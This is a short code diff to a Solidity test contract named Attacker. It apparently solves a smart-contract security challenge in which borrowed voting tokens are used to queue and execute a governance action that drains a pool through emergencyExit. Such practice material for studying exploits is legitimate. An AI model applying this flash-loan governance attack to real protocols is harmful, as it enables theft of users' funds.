@@ -41,8 +41,8 @@ contract Attacker is IERC3156FlashBorrower, Test {
     ) external returns (bytes32){
         votingToken.delegate(address(this));
         uint256 actionId = governance.queueAction(address(pool),0,abi.encodeWithSelector(pool.emergencyExit.selector, recovery));
-        
-        votingToken.approve(attacker,TOKENS_IN_POOL);
+
+        votingToken.approve(address(this),TOKENS_IN_POOL);
         votingToken.transfer(address(pool),TOKENS_IN_POOL);
         vm.warp(block.timestamp + governance.getActionDelay() + 1);
         governance.executeAction(actionId);
